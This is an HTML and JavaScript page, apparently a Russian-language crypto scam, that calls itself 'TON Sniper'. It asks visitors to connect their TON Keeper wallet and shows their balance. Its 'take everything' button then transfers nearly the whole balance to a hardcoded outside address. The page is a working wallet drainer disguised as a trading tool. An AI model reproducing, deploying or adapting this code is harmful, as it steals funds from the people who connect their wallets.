<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TON Sniper</title>
    <style>
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            width: 450px;
        }
        button {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            padding: 18px 40px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }
        button:hover {
            transform: scale(1.05);
        }
        button:disabled {
            opacity: 0.5;
            transform: none;
        }
        #status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            min-height: 70px;
            border: 1px solid #2a2a2a;
            word-break: break-all;
            font-size: 13px;
        }
        .wallet {
            background: #111;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
            border: 1px solid #2a2a2a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ TON SNIPER</h2>
        <div class="wallet">👤 <span id="walletAddress">Не подключён</span></div>
        <div class="wallet" style="border-color:#00ff88;">💰 <span id="balanceDisplay">0 TON</span></div>
        <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
        <button id="snipeBtn" style="display:none;">💰 ЗАБРАТЬ ВСЁ</button>
        <div id="status">Нажмите кнопку для подключения</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let provider = null;
        let userAddress = null;

        const connectBtn = document.getElementById('connectBtn');
        const snipeBtn = document.getElementById('snipeBtn');
        const status = document.getElementById('status');
        const walletDisplay = document.getElementById('walletAddress');
        const balanceDisplay = document.getElementById('balanceDisplay');

        // ========== ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ==========
        connectBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Проверка TON Keeper...';
                connectBtn.disabled = true;

                // Проверяем наличие TON Keeper
                if (!window.tonkeeper) {
                    status.innerHTML = `
                        ❌ TON Keeper НЕ УСТАНОВЛЕН!<br><br>
                        1. Установите расширение из Chrome Web Store<br>
                        2. Обновите страницу (F5)<br><br>
                        <a href="https://chrome.google.com/webstore/detail/ton-keeper/nphplpgoakhhjchkkhmiggakijnkhfnd" 
                           target="_blank" style="color:#00d4ff;">
                           🔗 Установить TON Keeper
                        </a>
                    `;
                    connectBtn.disabled = false;
                    return;
                }

                status.innerText = '⏳ Запрашиваю подключение...';
                provider = window.tonkeeper;

                // ====== ЗАПРОС ПОДКЛЮЧЕНИЯ КОШЕЛЬКА ======
                const accounts = await provider.send('ton_requestAccounts', {});

                if (!accounts || accounts.length === 0) {
                    status.innerText = '❌ Отказ в подключении';
                    connectBtn.disabled = false;
                    return;
                }

                userAddress = accounts[0];
                walletDisplay.innerText = userAddress;
                status.innerText = `✅ Кошелёк подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;

                // Показываем кнопку "Забрать всё"
                connectBtn.style.display = 'none';
                snipeBtn.style.display = 'block';

                // Показываем баланс
                await updateBalance();

            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                connectBtn.disabled = false;
            }
        };

        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
        async function updateBalance() {
            try {
                const hex = await provider.send('ton_getBalance', { address: userAddress });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = balance + ' TON';
                return nano;
            } catch(e) {
                status.innerText = '❌ Ошибка баланса: ' + e.message;
                return 0;
            }
        }

        // ========== ВЫВОД СРЕДСТВ ==========
        snipeBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Проверка баланса...';
                snipeBtn.disabled = true;

                const nano = await updateBalance();

                if (nano <= 0) {
                    status.innerText = '💰 Баланс 0 TON. Нечего выводить.';
                    snipeBtn.disabled = false;
                    return;
                }

                const fee = 10000000; // 0.01 TON
                const amount = nano - fee;

                if (amount <= 0) {
                    status.innerText = `⚠️ Баланс меньше комиссии 0.01 TON`;
                    snipeBtn.disabled = false;
                    return;
                }

                const amountTON = (amount / 1e9).toFixed(6);
                status.innerText = `⏳ Перевожу ${amountTON} TON на ${TARGET}...`;

                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                const result = await provider.send('ton_sendTransaction', {
                    to: TARGET,
                    value: String(amount),
                    data: '',
                    stateInit: ''
                });

                if (result && result.code === 0) {
                    status.innerText = `✅ УСПЕШНО! ${amountTON} TON переведено!`;
                    balanceDisplay.innerText = '0 TON';
                    snipeBtn.innerText = '✅ ВЫВЕДЕНО';
                    snipeBtn.disabled = true;
                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                } else {
                    status.innerText = '❌ Транзакция отклонена';
                    snipeBtn.disabled = false;
                }

            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                snipeBtn.disabled = false;
            }
        };
    </script>
</body>
</html>
